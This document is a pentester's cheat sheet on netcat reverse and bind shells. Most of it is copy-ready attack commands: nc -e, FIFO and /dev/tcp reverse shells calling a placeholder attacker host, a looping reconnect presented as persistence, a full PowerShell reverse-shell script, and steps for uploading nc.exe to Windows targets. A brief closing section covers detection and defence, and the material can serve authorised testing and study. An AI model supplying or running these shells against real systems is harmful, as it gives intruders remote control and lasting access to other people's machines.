# Reverse Shells — Netcat

## What is Netcat?

Netcat (`nc`) is a versatile networking utility that reads and writes data across TCP/UDP connections. Often called the "Swiss Army Knife" of networking, it's used for port scanning, file transfer, chat, and — most relevantly for pentesters — establishing bind and reverse shells.

---

## Netcat Variants

Different systems ship different versions, and the flags vary:

| Variant | Notes |
|---|---|
| `ncat` (Nmap) | Most feature-rich; includes `--exec` and SSL |
| `nc` (GNU) | Traditional, most common on Linux |
| `nc.traditional` | Older Debian/Ubuntu; supports `-e` flag |
| `nc.openbsd` | Stricter; often lacks `-e` |
| `nc.exe` | Windows version |

Check which version you have:
```bash
nc --version
nc -h 2>&1 | head -5
```

---

## Listener Setup (Attacker)

Always set up the listener before triggering the shell on the target:

```bash
# Standard listener
nc -lvnp 4444

# With ncat (supports SSL)
ncat -lvnp 4444

# Catch multiple connections
nc -lvnp 4444 -k     # -k = keep listening after disconnect
```

---

## How Netcat Shells Work

The key flag is `-e` (execute) — it pipes stdin/stdout to a command:

```bash
# Target runs (if -e is supported)
nc attacker_ip 4444 -e /bin/bash        # Linux
nc attacker_ip 4444 -e cmd.exe          # Windows
```

However, **many modern nc versions don't include `-e`** due to security concerns.

---

## Alternatives When -e Is Not Available

### Using a FIFO (named pipe)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc attacker_ip 4444 >/tmp/f
```

**How this works:**
1. `mkfifo /tmp/f` — create a named pipe
2. `cat /tmp/f` — read from the pipe (waits for input)
3. `| /bin/bash -i 2>&1` — feed to bash, redirect stderr to stdout
4. `| nc attacker_ip 4444 >/tmp/f` — send output to attacker, attacker's input goes back to pipe

This creates a bidirectional loop through the FIFO.

### Using /dev/tcp (no nc needed)
```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

---

## Bind Shell (Reverse of Reverse Shell)

Sometimes you can connect TO the target (no firewall blocking incoming):

```bash
# Target: Open a listening shell
nc -lvnp 4444 -e /bin/bash

# Attacker: Connect to target
nc target_ip 4444
```

---

## Netcat for Reconnection (Persistence)

```bash
# Loop — reconnects if connection drops
while true; do nc attacker_ip 4444 -e /bin/bash; sleep 5; done
```

---

## Windows Netcat

`nc.exe` can be uploaded to a Windows target and used the same way:

```powershell
# Upload nc.exe to target (via file upload vuln, SMB, etc.)
# Then execute:
nc.exe attacker_ip 4444 -e cmd.exe
nc.exe attacker_ip 4444 -e powershell.exe
```

Alternatively, use PowerShell without nc.exe:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("attacker_ip", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

---

## Upgrading Netcat Shell to TTY

```bash
# Step 1 — On target, spawn PTY with Python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 — Background with Ctrl+Z

# Step 3 — On attacker
stty raw -echo
fg

# Step 4 — Fix terminal
export TERM=xterm
stty rows 45 cols 185
```

---

## Netcat for Port Scanning and Recon

```bash
# Quick port scan (TCP)
nc -zv target_ip 20-1024

# Check single port
nc -zv target_ip 80

# UDP scan
nc -zvu target_ip 53

# Banner grabbing
echo "" | nc -v -n -w 2 target_ip 80
```

---

## File Transfer with Netcat

```bash
# Receiver (destination)
nc -lvnp 4444 > received_file

# Sender
nc target_ip 4444 < file_to_send
```

---

## Detection (Blue Team)

- Netcat process (`nc`, `ncat`) making outbound connections
- FIFO files in `/tmp` with suspicious names
- Processes with shell spawned from unexpected parent (web service → nc → bash)
- Unusual outbound connections from servers on non-standard ports

```bash
# Find nc processes with connections
ss -tp | grep nc
lsof -i | grep nc
```

---

## Defense / Prevention

- Egress filtering — deny outbound from servers on unusual ports
- Block/alert on nc/ncat execution via EDR or AppArmor
- Monitor `/tmp` for FIFO creation
- File integrity monitoring on critical paths

---

## References

- [Netcat man page](https://linux.die.net/man/1/nc)
- [PayloadsAllTheThings — Netcat Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat)
- [RevShells.com](https://www.revshells.com/)
